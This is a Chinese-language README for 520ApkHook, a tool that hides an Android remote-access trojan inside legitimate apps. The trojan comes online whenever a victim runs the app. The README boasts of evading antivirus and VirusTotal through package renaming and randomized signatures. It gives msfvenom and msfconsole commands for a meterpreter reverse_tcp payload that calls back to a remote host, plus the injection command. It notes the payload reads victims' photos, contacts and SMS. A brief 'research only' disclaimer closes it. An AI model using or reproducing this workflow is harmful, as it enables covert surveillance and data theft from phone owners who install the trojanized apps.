# 520_APK_HOOK

## 介绍

* 将编写的安卓远控程序，注入到正常的App中，运行app时安卓远控程序也会上线。

* 修复上一版本的bug，使用java重写，同时还重写了520ApkBox程序，专门用来运行运行APP和远控App。

* 520ApkBox是一个java编写的App，主要作用是一个安卓虚拟机，任何App可以不用任何修改就可以正常运行，可以绕过现在各种App的安全检测。同时此App还是一个加载器，通过DexClassesLoder加载远控的Dex文件并启动上线。

* 520ApkHook是Java编写的注入工具，将被注入的App和远控App注入到一个App中。

* 项目地址:  [https://github.com/ba0gu0/520apkhook](https://github.com/ba0gu0/520apkhook)

* 作者: BaoGuo

## 版本升级

* 2024-07-02
  * 修复Linux运行bug，缺少so库文件。

* 2024-06-20
  * 修复各种bug。
  * 新增了改包模块，把payload apk的包名修改掉，去掉特征，避免被杀软识别。目前修改后效果不错，各安全管家、virustotal都不报毒。

* 2024-05-21
  * 修复了520apkhook的相关问题（app中文名报错、apk签名被标记。）

  * 新增了随机签名的功能，先获取原始app的相关签名信息，根据这些信息重新生成新的签名，签名密码每次都不一样，避免被标记。(有些app会无法识别签名信息，可以自己用jadx获取到app的签名信息，然后生成证书，使用[ApkSigner](https://github.com/jixiaoyong/ApkSigner)进行重新签名。华为目前还有问题，改签名也会被识别恶意app)

  * 更换了两个安卓虚拟机，[NewBlackbox](https://github.com/ALEX5402/NewBlackbox)、[SpaceCore](https://github.com/FSpaceCore/SpaceCore)。安卓版本支持到`5-14`。

  * 新增了`-b, --boxName`参数，用来指定`SpaceCore`还是`NewBlackBox`，默认SpaceCore，如果出现卡顿或者闪退，可以尝试切换到NewBlackBox。直接指定参数 `-b NewBlackBox` 即可。

* 2023-06-05
  * 上版本忘记添加32位app支持，此次升级加入32位app支持。更换了虚拟机项目依赖，稳定性更好一下。

  * 支持安卓5-12版本，不支持最新的安卓13。

  * 问题1、目前有问题的app，微信、ES文件浏览器。

  * 问题2、被注入的app读取到的文件、图片、通讯录、短信是虚拟机的内容，但是注入的payload获取到的是实体机的内容。


## 优点

* 相比于普通的安卓远控，此版本app在进行远控时，被注入的app可以正常运行。

* 注入后的app在安装时，手机管家不会有任何安全提示，普通的远控程序，安装时手机管家会有安全警示。

* 理论上来说，只要远控软件使用的是纯Java或者Kotlin编写，就可以使用，不一定必须是msf生成的apk。


## 使用

1. 下载Releases中打包好的jar包  

 * [a520ApkHook-1.2.1-jar-with-dependencies.jar](https://github.com/ba0gu0/520apkhook/releases/download/v1.2/a520ApkHook-1.2.1-jar-with-dependencies.jar)

2. msfmsfvenom

```shell

msfvenom -p android/meterpreter/reverse_tcp lhost=114.114.114.114 lport=3306 -o ~/Downloads/msf.apk

```
3. msfconsole

```shell
# 启动 msfconsole

use exploit/multi/handler
set payload android/meterpreter/reverse_tcp
set lhost 0.0.0.0
set lport 3306
set exitonsession false
exploit -j
```
4. 520ApkHook

> msf由于加载机制问题，需要`-o`参数，才可以获取照片、通讯录、短信等。
>
> 如果在运行app时，提示版本太老、一堆权限提示，可以把`-o`去掉，但是权限会出问题。

```shell

java -jar a520ApkHook-1.0-jar-with-dependencies.jar -o ~/Downloads/想进行注入的App.apk ~/Downloads/msf.apk

```

5. BaoGuo仍给你一个Apk，请安装它!

### 搭配其他远控使用

* 推荐搭配`AhMyth`，配在一起贼爽。

> 使用AhMyth时，不需要添加`-o`参数，不然app会提示版本太老，一堆权限提示太假。
>
> [https://github.com/Morsmalleo/AhMyth](https://github.com/Morsmalleo/AhMyth)


## BUG

* 使用SpaceCore作为基础容器，能运行90%的app，但可能会出现app不流畅。
* 使用NewBlackBox作为基础容器，目前测试不能在模拟器中运行，微信无法启动。
* 其他未测试...

## 项目依赖

* 本项目参考以下项目
* [https://github.com/ALEX5402/NewBlackbox](https://github.com/ALEX5402/NewBlackbox)
* [https://github.com/FSpaceCore/SpaceCore](https://github.com/FSpaceCore/SpaceCore)


## 重点说明

* 本项目仅用于安全研究, 禁止利用脚本进行攻击, 使用本脚本产生的一切问题和本人无关.

* 由于此软件是基于安卓虚拟化来实现的，虚拟化软件对于不同版本的系统会出现BUG，可以自行修改520ApkBox项目源码 (欢迎大佬提交pull) .



## Start 曲线

[![Start 曲线](https://starchart.cc/ba0gu0/520apkhook.svg)](https://starchart.cc/ba0gu0/520apkhook)
